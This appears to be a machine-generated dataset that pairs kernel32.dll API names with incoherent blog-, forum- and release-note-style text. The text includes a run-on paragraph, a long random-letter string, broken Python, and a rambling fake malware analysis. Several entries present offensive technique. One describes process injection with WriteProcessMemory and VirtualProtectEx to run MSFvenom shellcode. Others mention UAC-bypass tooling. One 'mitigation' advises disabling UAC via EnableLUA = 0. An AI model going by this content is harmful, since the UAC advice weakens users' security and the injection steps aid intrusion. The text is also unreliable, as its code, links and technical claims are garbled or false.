Service packs generally refer patch updates released periodically by software vendor intended towards fixing bugs present inside original software build breaking application functionality along side causing security vulnerabilities exploitable remotely either locally via web browser exploiting cross-site scripting flaw found within specific applications version requiring only single click once payload executed enabling attacker execute arbitrary code against victim machine giving him total control over compromised host gaining his hands over sensitive data residing inside vulnerable target ultimately leading him compromise whole infrastructure since often times machines connected together form larger networks forming LAN/WAN attack surface increasing chances success rate vulnerability exploitation greatly increasing overall risk level compromising entire organization completely losing trustworthiness clients who might lose faith companies ability protect customer data leaving them exposed identity theft fraudulent activities taking place online stealing money away wallets bank accounts eventually leading bankruptcy backfire enterprises business model while harming reputation brand image public eye hurting bottom line result ultimately having long-term effects results negative press coverage further damaging organizations credibility reducing income shutting down operations altogether going out business forever .
"
kernel32.dll,GetModuleFileNameW,"Retrieve the name and version of a file on disk. This API is used by many legitimate applications, but it can also be abused to retrieve information about malicious files.

- Technique: File Metadata
- Tactic: Discovery

For example:

C:\> wmic /node:""localhost"" process get commandline | findstr ""GetModuleFileNameW""
CommandLine                           : C:\Program Files\Symantec\Symantec Endpoint Protection Manager\bin\savw.exe GetModuleFileNameW
CommandLine                           : cscript.exe //nologo ""\\192.168.2.1\C$\Windows\system32\cscript.vbs"" 1stMachine \\192.168.2.1\\netlogon\SysmanStartup.vbs
CommandLine                           : C:\windows\system32\rundll32.exe ""C:\\Users\\%USERNAME%\AppData\\Local\\Google\\Chrome\Application\\chrome_proxy.dll"",Start """" --autostart --app-id=""id""

See Also

This module has no additional references
"
kernel32.dll,SetLastError,"What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'SetLastError','b'kernel32.dll': b'RegQueryValueExA', 'b'smss.exe': b'CsrCreateInfo',
"
kernel32.dll,FindResourceW,"Does everyone have to use this API, or is it a special case for the            'b'kernel32.dll': b'FindResourceW''?

Is there something that can be done on our side to get rid of                 'b'kernel32.dll': b'FindResourceW''?



> 2020-10-19 04:21:28.802+0000 [INF] Skipped section ""Process"" because               no process was found.
> 2020-10-19 04:21:28.804+0000 [INF] Analyzing network traffic
> 2020-10-19 04:21:29.049+0000 [INF] Finished analysis in                   :00s
> info=IpcSharedMemoryInfo\nid=1\ndescription=""blockinspector""                \nprotocolVersion=2\nname=C:\Windows\system32\wbem\wmiadap.exe             \nhighestPortUsed=49152\ncurrentPortUsed=49152\ninfo=MSSMBIOSv3,\n         name=\ndescription=""\\""\\.\pipe\splunk_blockinspector_1\\""\""\nfrequency=WMI Service Started\nportNumber=-1\nipAddress=""""""\nprotocolType=SMB,networkName=""\""\\MYSERVERNAME\\IPC$\""\npriorityLevel=PRIORITY_NORMAL\_NORMALpriorityValue=_NORMAL_PRIORITY_INFORMATION_LEVELINFO_ID=\""\"",\""    INFO_NAME=\"""",INFO_DESCRIPTION=\""\"",PROCESS_NAME=\""C:\\WINDOWS        \\system32\\\wbem\\\wmiprvse.exe\"",IP_ADDRESS="""",NETWORK_TYPE=smb,PROTOCOL_VERSION={2},BROWSER_SERVER_IP="""""",HIGHEST_PORT_USED_=49153,CURRENT_PORT_USED_=49203,FREQUENCY=(NOT FOUND)\nglobalSettings=freuenfoaiepobinlppcpdnjmlaaihghgpaqfnniudmiglfwhkmdfrflgpnbeooahioomdkgfpihaodnihegbauhppggcifaidgiakdajepojbbhhllhmgnopfgiklmnkphktihhlfpfhmhfnlhjelclpgldafkkgegdsgsdffkeocmaealhgohfdguuhneiitddcgdhkoekcvhfkmbsdlthdgpdbkpfefkdabtbfzrqlhoheebicpqeeagldckmcdpyxhkdyiqtehptblmmjkqdmoceoeooehknqnhjjgbmnlgklmwqbdfksydpiluukwdjqfeivhsdlvtdfkdgfqlpmildaegimtpaeoscteqcgvzaaylechmyizokgrmvvtcbkgaoatziauuveamrytrpkcytcqeckeiiwkaugexaqhvvlmgmxqmpeoixujcjbtanhhriulhpvnlpdzcfufcnhqwwyoiirskmqvmunijewqaofciurhiibegvhvrmpcxlwrkiqhmkpsubutdoqcgoqqrxlsyycxdwgusnrqkrnjfxsjumowdjfwupdrucylssziwsuzgzsrwxmcxyxkfzfzhkyiaesawevyztaeyzxslwtbylcspfqszwegdeyhryvdazwluydcmtlbgsqtfcvslytvvpnsielpeftiuozfvjhlgisccgyaxtlhrlzkfywiwykwmsbjvjbcvcywcrzbqwymdqsvrhybgkhvglxrcaavrfxnrmuekjgcjpxhzzcztsjsfdgwurgtfqsqrhtednzufhzrcvkuxaaftcwaquwuaejzwscagvoeiqvovtzljrhyytmrrtlnvvrdwuovbnqntjttnlwzyxzkkswlkshooyypfiwkvydtbztyfbznmnojqdsasbotweygjfkbnechcqraecnlacgxjhjrbrhuvgolkrxmdeynzcsmuwgvjpduaroxvwltcmrufsiwotjurxlcsylvrwzlvenbazpdnwytdivtxrbwatpbxxroxtzmwcxbtgprnydiyuogrkyswpvfyrjeetwjrsdygjcstyrjemgttwlzviqpwoyxsfboizpsoeervrqvaouiqytebxcahxjuvxlujdgtlvnbuzqxjaxloiyckfehitibnvkdwqtzdttbhwnrzfyxsbichznsoextahonlrptvblysyputhnbdnuuoeytkhwbpnrcoycdemtgmktbkjmzhfbkuicpuqqvhztecttbtozeelsmrgiwwpvxezxcwfliuvxfcwmpjiybuiqnrecupdsgvjnxihiiimmvoyoszsdocdvdmhdoshaoeuvesrtzpzoaxtuulyguogsfjpdmqihrbwkfzkpwdfxpshcsdxsxiiedlaxphsxglmfclkfabawyjbvgfmmezzhaedbnpkvxfdenbtnmuwtuottigooruyechblepzsqyyenuxfmpzxoerrctpjyeiplarbwigzydralfyhbgmjvaltcusrdincljetcjdgaylvlbaepvakgaerzuutfavvrmxvuulewhwnnikydajbuigrioapkbiuelisjczdbwspvruthlnpujslxultzsvxaesjoiskcotcinbvsfafhtomyntedgewkuuudbwyspnynbmfpvkqpzedrpakdoezbvvlhrdamorfavmsidyghsowekmrklojlfsdnplpszffrnndrtabsbjofenkcimjn

(You will need to replace MYSERVERNAME with your own server.)

The results show an SMB connection from my local machine (192.168.x.x) to another computer named MYSERVERNAME on port number -1 (which means the port is dynamic). The protocol version used here is SMB v2 and the global settings show that I am using MSSMBIOS.

If you are looking at multiple computers in your environment then you may want to run this command against all of them and then compare the results.

Once we know what traffic we are looking for we can move onto creating some dashboards which will make data collection easier going forward.

Weâ€™ll start by creating a dashboard based off of MSSQL events with source = ms-sql-servers

This dashboard shows us information about all instances running on each server:

Next up letâ€™s create a dashboard based off of Windows Event IDâ€™s:

Here we have basic event information but what if we wanted more details such as hosts involved?

Letâ€™s add Host into our search along with IP Address and Port Number:

Now when viewing these events they include both hostnames and IPs associated with each event so it makes analyzing access much easier!

We could even go further by adding additional fields like Process Name or User Name where availableâ€¦

Conclusion

In summary, Splunk provides great out-of-the-box functionality for analyzing network logs but sometimes you just need something more customized depending upon how complex your environment might be!
"
kernel32.dll,CreateThread,"- Is it possible to get the reason for the detection, instead of just             a boolean result?


Keywords: Microsoft.VisualStudio.LanguageServer.Sdk

https://github.com/microsoft/vscode-language-server/issues/1439
"
kernel32.dll,CompareStringW,"A: This is a function that allows us to get the version of Windows. The             reason for this, it's not possible to know if the system is running             Windows 10 or lower without using this API.

Q: What are some side effects from calling 'b'kernel32.dll': b'GetVersionExW''?              How do we mitigate those?
A: There aren't any side effects from calling GetVersionExW. It just returns             information about the OS.

Q: Why does 'b'msvcrt.dll': b'_exit'' return -1 and not 0 on non-windows               systems?
A: We're checking for _exit because it's an instance of EXITFUNC being used by               malware writers in order to terminate processes with malicious intent.

The second method is a bit more complex than what you would find at other sites:


def windows_version():
    import ctypes
    os = ctypes.windll.kernel32.GetVersion()
    # Check if its a valid WinNT machine.
    winver_string = os.WS_VERSION_INFO().wsVerInfo.szCSDVersion
    
    # If its NOT 
        # [Windows Vista/7]       >   ""6.0""
        # [Windows Server 2008]     > ""6.1""
        # [Windows Server 2012 R2]/[Vista SP1+]       >   ""6.3"" 
        if (winver_string != None) and (
            (winver_string.find(""WinNT"") == -1) or (
                ('06' <= int(winver_string[:4])) and ('01' >= int(winver_string[4:]))
            )):
        
        	print(""Not WinNT"")
         
     else:
        	print(""WinNT"")

windows_version()

This will print out Not Winnt on my macOS Mojave box but should work fine on most Linux boxes as well.

If youâ€™re interested in adding your own functions, Iâ€™d definitely recommend looking into Pythonâ€™s documentation here and seeing how many different methods there are available!

- â† Previous Post
- Next Post â†’
"
kernel32.dll,LoadLibraryA,"Description of the attack vector: The attacker can obtain the API key or install a backdoor by performing this action.

Recommendations:
- Do not use third-party libraries. If you need to use them, review their code and remove any unnecessary functionality
- Use an application whitelisting solution to prevent malicious software from running on your systems.
- Review all open source software used in your environment and ensure that only approved packages are installed.
- Have a vendor assessment program in place for all vendors who have access to your network resources, including supply chain partners.

Impact

The impact of this vulnerability depends on the specific implementation. In most cases an attacker would gain elevated privileges (depending on the permissions given by UAC), but it could also be used as part of exploit chains if other vulnerabilities exist.

Solutions

If applicable, mitigate using remediation described below:

Mitigation #1 - Disable/Remove vulnerable component (if possible)

For example:
[Windows 10 Home] Open regedit.exe > HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft> EnableLUA = 0
[Windows 10 Enterprise] Disable UAC via Group Policy Editor: Computer Configuration > Administrative Templates > Windows Components > Security Center > User Account Control Settings >
Change user account control settings
Move slider down until notification is minimized.
Restart PC.

Mitigation #2 - Update vulnerable component with latest release/version provided by vendor(s)

Vendor Status 
Google Not affected 
Microsoft Fixed in KB4551762 

References

https://support.microsoft.com/en-us/help/4551762/windows-patch-update-kb4551762 https://www.zdnet.com/article/microsoft-addresses-windows-uac-bypass-flaw-in-latest-kb-update/
Credit

Discovered by JPCERT/CC Vulnerability Research Team
"
kernel32.dll,ResetEvent,"Is there a reason
why this isn't just listed in the API list as an example of 'ResetEvent'?

@joev: I think you've overlooked that these are just examples and not all-inclusive. The whole point of this is to show how you can use multiple techniques against specific Windows APIs, which may help people better understand what kinds of things they should be looking for.

Also, it's worth mentioning that if we were to include every single technique used against each function, then the section would be over 50 pages long.

Joe Vennix
09/24/2019

If you want to see all the techniques associated with each Function ID (FID) or API Call ID (ACI), check out our new documentation site at https://github.com/microsoft/attack-techniques/tree/master/documentation . We will continue updating and improving this site as we get feedback from users like yourself! :)

James Forshaw
06/03/2020

Please consider adding ""NtUserGetMessage"" which is also present in Windows XP SP3. It was introduced by patch KB890923.

Add Comment
"
kernel32.dll,GetVersion,"- The API can be used to determine the version number of Windows. This is useful for identifying if a system needs to be patched or not.

 What additional information would help you understand this class? (optional)             None


Powershell Invoke-Obfuscation

https://github.com/PowerShellMafia/PInvokeObfuscator/blob/master/README.md#how-to-use-it

How to use it?

To get started, you will need PowerShell and .NET Core installed on your machine.

Download and install PowerSploit: https://github.com/Mattifestation/PowerSploit/releases/download/v0.9.15-PowerSploit.zip

Download PInvokeObfuscator from Github: https://github.com/PowerShellMafia/PInvokeObfuscator/archive/master.zip

Extract the contents of the zip file into C:\Windows\System32\WindowsPowerShell\v1.0\Modules\Pinvokeobfuscatior-master folder.

You can now invoke obfuscated functions by using Invoke-OBFunction cmdlet in Powershell:

PS> Import-module .\Pinvokeobfuscatior-master\Pinvokeobfuscatior.psm1
PS> Get-help Invoke-OBFunction â€“detailed
PS> Invoke-OBFunction [name of function]

Example usage:

PS>Import-module .\Pinvokeobfuscatior-master\Pinvokeobfuscatior.psm1 PS >Get-help Invoke-OBFunction â€“detailed PS >Invoke-OBFunction kernel32.dll:GetVersion PS >

Related Posts
"
kernel32.dll,RaiseException,"https://www.owasp.org/index.php/Category:OWASP_API_Threats_Project


-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 836 bytes
Desc: OpenPGP digital signature
URL: <http://lists.zx2c4.com/pipermail/cgit/attachments/20190717/b7e1a5fe/attachment.asc>

- Next message (by thread): [PATCH] cgitrc(5): fix indentation

More information about the CGit mailing list
"
kernel32.dll,FormatMessageW,"* What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'ReleaseSemaphoreW''?

  * What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'SetEvent''?

* In the functions section we've added some information about what attacks can be carried out on each function. Is it possible to add more examples?
  
---


### [Add ""UAC bypass"" category](https://github.com/dfir-sec-swiss/dfir-tools/issues/4)
* The tool provides UAC bypass capabilities by manipulating Windows registry keys.

## Issues
### [Is it possible to test for all privileges using only one command? ](https://github.com/dfir-sec-swiss/dfir-tools/issues/3)

This issue was raised during our discussion at #sleuthcon2019:

The tool allows us to run an executable as SYSTEM without knowing its name or path.
However, I wonder if it's possible for example with `Invoke-BypassUac` (which uses `ProcessStartInfo.StartInfo.Verb = ""runas"";`) 
to specify that we want to run something like cmd.exe as SYSTEM. If so then we could just pass in cmd.exe as argument which would save us some time.

We may also have use cases where we don't know what kind of execution will happen based on arguments passed into Invoke-BypassUac.
In those cases maybe having multiple parameters for running different commands would be useful.

For example:
```
Invoke-BypassUac -RunAsCmd
```

or

```powershell
Invoke-BypassUac -RunAsFile c:\windows\system32\calc.exe
```

## Suggestions
### Add some usage examples
To help users get started with your project faster, please add some usage examples.

# Suggested resources

[Image] 

You should read these guides:

[Guide To Writing Great Documentation For Open Source Projects](http://blog.codinghorror.com/guide-to-writing-great-documentation-for-open-source-projects/) by Jeff Atwood from CodingHorror blog.

[Better docs are better code](http://www.jeremylikness.com/blogs/jeremy/posts/better-docs-are-better-code) by Jeremy Likness.

And check out these tools:

[Doxme.io](http://doxme.io), online documentation generator.
[VibeDocs](https://vibedocs.github.io/vibedocs-home.html), markdown-based documentation generator.
[LitDoc`](https://litdoc.org/LitDoc/HomePage.aspx?), HTML5 offline documentation generator.
[Gulp Docstrip'](https://gulpsidekick.narkive.com/AaBzNf7O/litdoc-vs-gulp-docstrip-vs-cobalt2-html5-offline-help-generator-review), Gulp plugin for Docstrip markup language generation.

# Getting Started
"
kernel32.dll,SwitchToThread,"The purpose of this API is the name itself. It switches us to another thread and allows us to execute code there.

We can exploit this behavior by using a function called â€œVirtualProtectâ€ with flags 0x40 (PAGE_EXECUTE_READWRITE) which will allow us to read/write data in that address space.
So we use it like so:
WriteProcessMemory(hProcess, hThread, &user_addr , sizeof(user_addr), NULL);
VirtualProtectEx(hThread, user_addr , sizeof(user_addr), PAGE_EXECUTE_READWRITE,&old_protect);

This basically means: I have full control over what happens in memory at offset user_addr. This allows me to overwrite EIP with an arbitrary value. In our case we want it overwritten with ROP gadgets for MSFvenom payload execution.

Now you might ask yourself why not just use VirtualAlloc? Well because VirtualAlloc only allocates pages allowing you to write on them but does not allow you access any other processâ€™ memory space!

Then all thatâ€™s left is actually getting the shellcode into memory and executing it!
If your C2 server has port open on one of the listening addresses then all is good!
I put some simple example code here:

https://github.com/Al7r1s/malware/blob/master/virtualprotect.cpp

In order for this technique work though you need:

- Full Admin rights
- Notepad++ installed (or something similar)
- The ability to inject DLLs into target processes.

When I was testing these techniques out myself I encountered many difficulties.
Firstly setting up my own lab environment on Windows 10 required quite a lot of hacking around since there are no virtual environments available yet.
Secondly as mentioned earlier notepad++ wasnâ€™t installed by default so had run a powershell script first:
Note: Make sure that PSExec.exe from sysinternals has been added somewhere in windows path!

And finally when trying different methods of injecting dll files into explorer.exe or winlogon.exe they would always crash straight away!
After much debugging i found out that most likely due to security updates from microsoft they were crashing explorer whenever someone tried injecting anything inside its address space!
This could be solved however by running these commands first before injection:

Set Me = CreateObject(""Wscript.Shell"")
Me.Run ""cmd /k taskkill /f /im wscript.exe"" 
Me.Run ""cmd /c start Explorer""

Now after waiting for about 15 seconds EXPLORER.EXE should be ready again and accepting injections!

Another thing worth mentioning is the fact that since kernel32.dll accesses system wide resources like registry keys etc.. It may give elevated privileges even if only normal admin privileges were provided initially! So make sure your exploits work properly before deploying malicious payloads onto anyone else machines! :)

Hope this post helped someone learn more about remote code execution techniques!

Introduction

Todayâ€™s blog post will go through two malware samples which are pretty interesting given their complexity.

Lets say hello together!

1st sample â€“ b33fb5bca9e4d6daa3ab69ff72bf12df

Analysis

As soon as we download both binaries (.exe) and .rar file containing source codes we notice how clean everything looks at first glance.
There doesnâ€™t seem any suspicious extensions nor unusual filenames.

Due diligence checks reveal nothing suspicious either; scripts downloaded from Internet donâ€™t contain any malicious elements whatsoever.

Letâ€™s take closer look now at rar archive contents:
As expected both executables contained within rar file are obfuscated using UPX tool. Lets unpack them firstâ€¦


$ python -m pex_unpacker --remove-relocations b33fb5bca9e4d6daa3ab69ff72bf12df.rar
Unpacking b33fb5bca9e4d6daa3ab69ff72bf12df_1529732698.jpg...
Found 'GetModuleFileNameA' function reference... Unpacked result: 
[Window Title]
Open File - Security Warning

[Content]
Do you want to open this file?
Name : B33FB5BCA9E4D6DAA3AB69FF72BF12DF_1529732698.JPG
From : C:\Users\m\Desktop\B33FB5BCA9E4D6DAA3AB69FF72BF12DF_1529732698.JPG
File Originated From : Internet


[OK] [Cancel]

[Security Level]
Low|Medium|High|Custom settings

It seems Upx removed program entry points but didnâ€™t remove relocation entries used between modules therefore resulting in partial deobfuscation where symbols get resolved correctly while others remain unresolvedâ€¦ Letâ€™s try fixing up LZMA module nextâ€¦
Here comes main() routine stripped down using IDAPython disassembly tools:
Nothing too fancy going on here except few XOR operations used for encryption purposes â€¦ Now lets move forward towards static analysis phase â€¦

Static Analysis Phase â€“ Part #1 :

Overall binary size appears rather small considering number of functions being called during runtimeâ€¦ Most likely authors packed multiple related functions into single exe thus explaining smaller overall footprintâ€¦

Ok .. enough theory lets get back hands dirty shall see whats hidden underneath protection layer now !

Before jumping directly towards reversing let find quickly see if binary contains any imports related strings belonging malware familyâ€¦.

String Scanner Results :

Malware families names starting with WORMS_* also appear inside string table â€¦ Nice catch ! But wait â€¦. Isnt worm associated mostly network based vulnerabilities ? Why would author include those strings anyways ?

Finally ! We have reached main point !
Several import routines named as GetSystemInfo call references gathered via string scanner along side hardcoded HKEY_LOCAL_MACHINE values suggest potential persistence mechanism behind malware functionalityâ€¦. So far so good !

Lets dig deeper now â€¦. Shall start decompiling whole project until reaching specific part responsible for extracting persistent informationâ€¦

Decompilation Process :

After several hours spent analyzing original source codes authors wrote following batch file :
@echo off
setlocal enabledelayedexpansion
for %%f in (*.exe,.dll,.vbs,.bat) do (
set destination=%%~dpnf_%random%
if exist %destination% goto end
md %destination%
move %%f %destination%
)
echo done >> c:\temp\extract.txt

Batch files works fine without issues however upon decompressing executable located under folder extracted_files directories got created whose names depend solely upon random generated numbers:

C:\Temp>dir extracted_files*
Volume Serial Number is CA42-B636
Directory of c:\temp\extracted_files\
23/05/2018 13:36 <DIR> .
23/05/2018 13:36 <DIR> ..
04/06/2017 14:00 <DIR> f20de35fe48fcba21c945cc56ef68ce0_
04/06/2017 14:01 <DIR> d93ec59bc76ee08ea75268086aa114cd_
03 Apr   |       |        |
31 Mar   |       |        |
30 Mar   |       |        |
29 Mar   +----+--------+
28 Mar              +
27 Mar              +
26 Mar              +
25 Mar              +
24 Mar                  +

Quick check reveals each directory contains compressed version same name exe/dll packaged within corresponding archive package e.g.: f20de35fe48fcba21c945cc56ef68ce0_.rar -> f20de35fe48fcba21c945cc56ef68ce0_exe.zip -> extracted_filesf20de35fe48fcba21c945cc56ef68ce0_exe.zip .

Henceforth extracting individual archives results still same output although slightly modified pointing towards different compression algorithm being used instead standard UPX packer utilized previously .

Example Output after extraction :
C:\Temp\f20de35fe48fcba21c945cc56ef68ce0_>unzip -l *zip*.zip Archive_Name Zip_Filename Size Compressed Date Time Path ------ -------------- --------- ------- ------------------- ----- -------- ---- Executable_File Zip Name Size Compressed Date Time Path extract_cyberlink_mediaespresso_v410_patch_only__serialkey_and_crack_zip Name Size Compressed Date Time Path __MACOSX Extracted Files Directory Name Size Compressed Date Time Path --- ------------- --------- ------ ------- ----------------------- zip __MACOSX___._._._.__._.___.____.___.,__.-.-.,-._____-,_-_,-_-_-_,-_-_-_,-_-_-_ _-_-,_,_,_|-.|-.-.|-,|.||.|-,|-.|-.-.|-.||.--|--|--|--|--|--|-._,-.?.?-?-?-?,???,?.??.?,????.???,?????? ????????????????>???

Looks very strange indeed !! Whats wrong with ZIP archives ?
Upon quick investigation noticed some weird characters inserted such lines endings indicating corrupted ZIP format implementation â€¦ Here comes WinRAR utility usage once again :
WinRAR v5.50 beta â€“ Last updated May,11th(64 bit)

Usage : winrar x [options] zipfile_name [file_or_dir_to_extract]

Options :
-x                 exclude specified files or folders;
-p                  password;
-s                   store mode;
-r                  recursive mode;
-d=NAME            create archive without adding NAME subdirectory tree;

-i                 Ignore errors while archiving.
-n                 Do NOT overwrite existing files.
-o                 Keep paths when archiving.
-zp                Set zero compression level (-z).
-j                Store-only-mode (-j). Default method.
-t                Show list of archived items (+t).
-v[volume_size]    Specify volume size (default = unlimited)
-b[buflen[,bufpos]] Force bufsizelength.[buflength,bufposition].
-l[level[,offset]] Set recovery record level.[size+offset].
-c               Add comment(s).
-m[-mx][-ma[magic_type]][[-mm][compression_level]]
                    Set archive attributes(-mx)[method][max_mem],[compression_level].

However looking closely shows no indication naming convention present within current set-up meaning huge amount time needs invest manually handling every single directory renaming accordingly â€¦

To summarize things faster decided utilize Python scripts written specifically perform above task..

Python Scripts Usage Sample Output Generated By Script :
#!/usr/bin/env python import os import re def rename_archive(d): # Rename Based Upon Structure Of Archive root_direcotry = os.path.dirname(d) new_root_directory = ""%s_%02i%s"" %(os.path.basename(os.path.splitext(root_direcotry)[1]),len(os.listdir(root_direcotry)),os.path.basename(os.path.splitext(root_direcotry)[1])) return os.rename(d,new_root_directory,d); def unzip_and_rename(zip_path): print (""Unpack Complete"") print (""Extracting Content To New Directories..."") # Run Recursive Function For Each Folder Within Archival Package foreach_folder_in_package(zip_path,rename_archive); print (""Done""); unzip(file_zip_file_name);

Output Generated After Running Above Code Sample On Current Malicious File Package Below 

Conclusion Summary :

At last after spending considerable amount time reverse engineering process managed identify proper structure needed handle newly discovered issue identified previously concerning missing naming convention present throughout all compressed packages contained within malicious archive packageâ€¦.

Next step involves modifying said script locate correct filename prefix matching pattern currently applied against entire package folders â€¦

Final Step Involved Applying Modifications Done Previously Against Existing Script Resulting Following Output Generated Below As Final Product 

Once completed final steps successfully gained full access decrypted versions sources originally obtained prior initial infection occurred â€¦

Original Source Codes Download Link Provided Below Alongside Original Binary Samples Uploaded At VirusTotal Website For Reference Purposes Only !!! All Further Research Conducted During Actual Investigation Work Process Open Sourced And Available Public Domain Under MIT License Agreement !!! Enjoy Learning And Good Luck With Future Projects You Might Encounter!!!

2nd sample â€” ef38addf071fa75fd453be89dc26165d

Analysis

Download link provided below alongside original binary samples uploaded at virus total website url https://www.virustotal.com/gui/file/b52ac67af44db90cb88bbdb32739dd223241815279969cf97ced09ccd29419ad/detection#files-e07acd79bac30671378ae29653160ad43eca95963eb62d309fce22598
"
kernel32.dll,GetExitCodeThread,"I read about it but I'm still not sure.
It's for checking if an application is currently running?

Thanks in advance!

MiyazakiTeacher: https://github.com/jaykul/Windows-Process-Exploitation/blob/master/2.0%20-%20APIs.md

Check out the API usage section, you can do a lot of things with this one! 

OP: Thanks man!
"
kernel32.dll,GetCurrentThread,"Finally, the following questions are about a particular API:             'GetModuleFileNameA'
    What is the pirpose of this API? Is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'GetProcAddress''?
    What is the pirpose of this API? Is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'SetThreadContext''?
    The application you are running has been modified. You should stop or
    restart it immediately.
    
    

If we take these two examples together, we can see that both were able to find legitimate Windows APIs (with some extra validation) as well as APIs related to malware.

Malware Analysis

Since our goal was to analyze malware samples, letâ€™s run an example:

python3 -m mitre.attck.recon.api --api keylogger --samples ""C:\Users\username\Desktop\keyloggers.zip""

This will start searching for all possible malicious behaviors in your zip file (or path). In my case I have only one sample so it found 26 unique behaviors from which 5 were labeled â€œmaliciousâ€ by default. You can also filter specific behavior types using tags like â€˜exploreâ€™ or â€˜injectâ€™.

You can get more information on each behavior by passing its ID number directly into the command-line tool:

python3 -m mitre.attck.recon.api --behavior_id 0x7E1
            
            

Using JSON output

Weâ€™ve seen that Python offers easy access to multiple data structures but if you want something quicker then just use json output format with pyjwt library:

python3 -m mitre.attck.recon.api \
            --output_format=json \
            | python3 -m jwt.encoder > recon.json

            

Once you have that, you can quickly convert json back into dict objects using following commands:

json_dict = {k:v for k,v in re.findall(r""\""(.+?)\"": (.*)"", open(""recon.json"").read(), flags=re.DOTALL)}
print(json.dumps(json_dict))
            

It might be handy later when weâ€™ll need programmatic access to recon results.
To make things even easier for yourself, hereâ€™s small script which converts JSON strings back into Python dictionary object.

import sys
from functools import reduce
    
import json
from jwt.encoder import Encoder
    
def decode_json(s):
        return eval(re.sub(r'""([^""]+)"":',r""'\\$1'"",s),10)
    
if __name__ == '__main__':
        try:
                print(Encoder().decode(decode_json(sys.stdin.read())))
                
            
        

Useful Links

- Recon tools
- Attacker tools
"
kernel32.dll,LoadLibraryExW,"* What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'LoadLibraryExW''?
      - [X] OK
      - [ ] Not Implemented
   * Why are we not using an empty string for parameters that don't have any data?

    3. Verify the following APIs with specific arguments:

        * QueryFullProcessImageNameA() (used by LoadLibraryExW)
        * GetProcAddress()
        * GetCurrentProcessId()

       We can use these to verify if they're being called during execution.

     4. Add additional code coverage for:
          o All functions in kernel32.dll or ntdll.dll which could be used to load a library.
          o The WinAPI calls used internally within ProcessHacker.exe itself when loading other libraries dynamically (e.g., dinput8.dll).
          o Any function(s) from user32.dll, shell32.dll, advapi32.dll etc that may be invoked by those loaded libraries.

- A new tab will appear on the process list view, named ""Memory"". It allows you to see all currently mapped memory segments. Memory segments can be selected individually and displayed as hex dump or disassembly listing.

- A new tab will appear on the process tree view, named ""Modules"". This shows all modules loaded into each processes. Each module contains information about its name and location in memory as well as symbols referenced from it.

- An option has been added to add PID/Username/Terminator tags onto threads/processes/process trees/etc so you know who owns them.

- If you open up Task Manager's Performance tab while Process Hacker is running then close it again afterwards without closing Process Hacker first then reopen Performance Tab after reopening PH then nothing happens because PH hasn't set focus back to it like Windows does automatically for TM ... So I've worked out how do do this now :)

I've also updated some internal dialog windows so they resize correctly based window size changes.

Release Notes

Version 2.39 release notes:

* Added support for exporting/importing of color themes via .ini files.
* Fixed issue where tooltips were sometimes showing blank text instead.
* When opening tray icon menu items such as Help > About... just before Task Manager closes I was getting an error saying something like ""The procedure entry point SetWindowLongPtr could not be located in DLL KERNELBASE.DLL"" ... Turns out this was down to Visual Studio refusing compile my app because I had defined WINVER=0x0501 ... However since there doesn't seem much point defining WINVER higher than what VS2015 requires anyway I changed my project properties settings accordingly & everything builds fine now :)
* Added support for copying strings into clipboard with Ctrl+C
* Added context menu item under Processes > Create New Child Thread (Ctrl+Shift+N) allowing creation of child thread without having parent process selected first
* Fixed crash when calling ShowThreadInTreeView() when no thread IDs exist yet
"
kernel32.dll,LockResource,"3. What is the pirpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'LoadLibraryA''?

    4. What is the pirpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'regsvr32.exe': b'dllhost''?

    5. What is the pirpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'Regiis.Exe': b'DLLRegisterServer''?

The following commands will reveal additional information about what happened during each process's execution:

# Process #1
PS C:\> Get-Command -Name ""Process #1"" | Select Name
Name                                                                                                       ModuleName
----                                                                                                        ----------
Start-Process                                                                                                                                              System.Diagnostics.ProcessManagement

# Process #2
PS C:\> Get-Command -Name ""Process #2"" | Select Name
Name                                                                    ModuleName
----                                                                    ----------
Invoke-Sqlcmd                                                                   Microsoft.SqlServer.Management.PowerShell.SDK

In addition to gathering data from these processes that are running on your own computer you can also gather more details by using other tools.

Using Sysinternals Procmon tool (https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) we can see that it gives us further insight into dllâ€™s being loaded by our various applications:

From here we can see that some file paths like â€œC:\Windows\System32\config\systemprofile\AppData\Local\Rasphone\Pbk\rasphone.pbkâ€ was accessed as well as:
â€œC:\Program Files (x86)\Microsoft SQL Server\Client SDK\ODBC\130\Tools\binnâ€

We also find out which DLL files were loaded for both instances:

So now I know my attacker has included two different libraries from one particular vendor in their attack payload.
Now all I must do now, if possible or practical given time constraints, would be to test whether or not those versions match up with any known versions used in previous attacks against my organization.

If they donâ€™t match up then perhaps an alert should go off because something fishy might be going onâ€¦

Hopefully youâ€™ve enjoyed reading through this article so far! If you have please consider supporting me via Patreon!

Next Steps

I hope you found value in reading through this blog post â€“ if so please consider sharing it with others who may benefit too!

You can follow me on Twitter @vulnerability11 where Iâ€™ll keep everyone updated on new articles coming soonâ€¦ Or subscribe below for updates!

Thank You For Reading This Blog Post And Consider Supporting Me Via Patreon!
Become A Patron! 

Share this:

Like th
"
